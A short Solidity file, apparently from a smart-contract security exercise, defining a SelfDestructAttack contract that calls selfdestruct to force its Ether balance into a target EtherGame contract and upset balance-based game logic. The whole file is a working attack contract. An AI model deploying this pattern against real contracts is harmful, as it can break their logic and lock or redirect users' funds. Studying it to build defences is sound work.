// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {IEtherGame} from "../interfaces/IEtherGame.sol";

contract SelfDestructAttack {
    address public game;

    constructor(address _game) payable {
        game = _game;
    }

    function selfDestructAttack() external {
        address payable addr = payable(game);
        selfdestruct(addr);
    }
}
